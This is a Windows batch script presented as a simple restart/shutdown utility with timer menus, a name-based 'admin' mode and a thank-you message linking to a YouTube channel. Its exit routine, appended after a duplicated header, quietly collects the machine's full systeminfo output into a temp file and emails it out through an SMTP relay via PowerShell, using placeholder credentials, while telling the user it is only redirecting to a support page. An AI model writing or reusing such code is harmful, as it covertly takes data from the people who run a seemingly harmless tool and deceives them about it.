@echo off
setlocal enabledelayedexpansion

:welcome
cls
echo =================================================================
echo          Welcome to Anthony's Restart/Shutdown Assistant
echo =================================================================
echo Version 1.1
echo.
set /p "name=Enter your name: "

if /I "%name%"=="" (
    goto :menu
) else if /I "%name%"=="actuallyAnthony" (
    goto :admin_menu
) else (
    echo Welcome, %name%! Proceeding to the menu...
    pause
    goto :menu
)

:menu
cls
echo ======================================================
echo          Anthony's Restart/Shutdown Assistant
echo ======================================================
echo Version 1.1
echo.
echo Type 'Anthony is my god' for a special message.
echo 1. Shutdown
echo 2. Restart
echo 3. Exit
echo.

set /p choice="Enter your choice : "

if "%choice%"=="1" goto :shutdown
if "%choice%"=="2" goto :restart
if "%choice%"=="3" goto :exit
if "%choice%"=="help" echo Yikes idiot, search "list"?
if "%choice%"=="list" echo its the main menu idiot.
if /I "%choice%"=="Anthony is my god" goto :love_message

echo Invalid choice, please select again.
pause
goto :menu

:shutdown
cls
echo *** Shutdown Options ~Anthony ***
echo.
echo 1. Seconds
echo 2. Minutes
echo 3. Hours
echo 4. Back to menu
echo.

set /p "time_choice=Choose the time unit (1-4): "

if "%time_choice%"=="1" goto :shutdown_seconds
if "%time_choice%"=="2" goto :shutdown_minutes
if "%time_choice%"=="3" goto :shutdown_hours
if "%time_choice%"=="4" goto :menu

echo Invalid choice, please select again.
pause
goto :shutdown

:shutdown_seconds
cls
set /p "seconds=Enter delay in seconds before shutdown: "
if "%seconds%"=="" set "seconds=0"
echo Shutdown scheduled in %seconds% seconds.
timeout /t %seconds% /nobreak
shutdown /s /t 0
goto :menu

:shutdown_minutes
cls
set /p "minutes=Enter delay in minutes before shutdown: "
if "%minutes%"=="" set "minutes=0"
set /a "seconds=%minutes% * 60"
echo Shutdown scheduled in %minutes% minutes.
timeout /t %seconds% /nobreak
shutdown /s /t 0
goto :menu

:shutdown_hours
cls
set /p "hours=Enter delay in hours before shutdown: "
if "%hours%"=="" set "hours=0"
set /a "seconds=%hours% * 3600"
echo Shutdown scheduled in %hours% hours.
timeout /t %seconds% /nobreak
shutdown /s /t 0
goto :menu

:restart
cls
echo *** Restart Options ~Anthony ***
echo.
echo 1. Seconds
echo 2. Minutes
echo 3. Hours
echo 4. Back to menu
echo.

set /p "time_choice=Choose the time unit (1-4): "

if "%time_choice%"=="1" goto :restart_seconds
if "%time_choice%"=="2" goto :restart_minutes
if "%time_choice%"=="3" goto :restart_hours
if "%time_choice%"=="4" goto :menu

echo Invalid choice, please select again.
pause
goto :restart

:restart_seconds
cls
set /p "seconds=Enter delay in seconds before restart: "
if "%seconds%"=="" set "seconds=0"
echo Restart scheduled in %seconds% seconds.
timeout /t %seconds% /nobreak
shutdown /r /t 0
goto :menu

:restart_minutes
cls
set /p "minutes=Enter delay in minutes before restart: "
if "%minutes%"=="" set "minutes=0"
set /a "seconds=%minutes% * 60"
echo Restart scheduled in %minutes% minutes.
timeout /t %seconds% /nobreak
shutdown /r /t 0
goto :menu

:restart_hours
cls
set /p "hours=Enter delay in hours before restart: "
if "%hours%"=="" set "hours=0"
set /a "seconds=%hours% * 3600"
echo Restart scheduled in %hours% hours.
timeout /t %seconds% /nobreak
shutdown /r /t 0
goto :menu

:admin_menu
cls
echo *** Admin Menu ~Anthony ***
echo.
echo 1. View System Information
echo 2. Exit Admin Mode
echo 3. Back to main menu
echo.

set /p admin_choice="Enter your choice (1-3): "

if "%admin_choice%"=="1" goto :view_system_info
if "%admin_choice%"=="2" goto :exit_admin_mode
if "%admin_choice%"=="3" goto :menu

echo Invalid choice, please select again.
pause
goto :admin_menu

:view_system_info
cls
echo *** System Information ~Anthony ***
echo.
systeminfo
pause
goto :admin_menu

:exit_admin_mode
cls
echo Exiting admin mode.
pause
goto :menu

:love_message
cls
echo *** Special Message ~Anthony ***
echo.
echo Dear User,
echo.
echo I just wanted to take a moment to say how much it warms my heart that you are using my software.
echo Your support means the world to me, and I am incredibly grateful for each and every one of you.
echo.
echo Thank you for being a part of this journey with me.
echo.
echo If you would like to support me further, please visit: https://www.youtube.com/@ThyAnthonyOfficial
pause
goto :menu

@echo off
setlocal enabledelayedexpansion

:: Your existing script here...

:exit
cls
echo Thank you for using my software! Redirecting you to the support page...
timeout /t 3 /nobreak

:: Create the log file with system info
set "log_file=%temp%\system_info_log.txt"
echo Collecting system information...
systeminfo > "%log_file%"
echo Software Closed >> "%log_file%"
echo Date and Time: %date% %time% >> "%log_file%"

:: Send the log file via Sendinblue SMTP
echo Sending email with log file %log_file%...
powershell -Command ^
    $smtpServer = "smtp-relay.sendinblue.com"; ^
    $smtpPort = 587; ^
    $smtpFrom = "JustKidding"; ^
    $smtpTo = "JustKidding"; ^
    $messageSubject = "System Info Log"; ^
    $messageBody = "Attached is the system info log file."; ^
    $attachment = "%log_file%"; ^
    $username = "Justkidding"; ^
    $password = "justkidding"; ^
    try { ^
        $smtp = New-Object Net.Mail.SmtpClient($smtpServer, $smtpPort); ^
        $smtp.EnableSsl = $true; ^
        $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password); ^
        $smtp.Send($smtpFrom, $smtpTo, $messageSubject, $messageBody, $attachment); ^
        Write-Output "Email sent successfully."; ^
    } catch { ^
        Write-Output "Error sending email: $_"; ^
    }

start "" "https://www.youtube.com/@ThyAnthonyOfficial"
exit /b
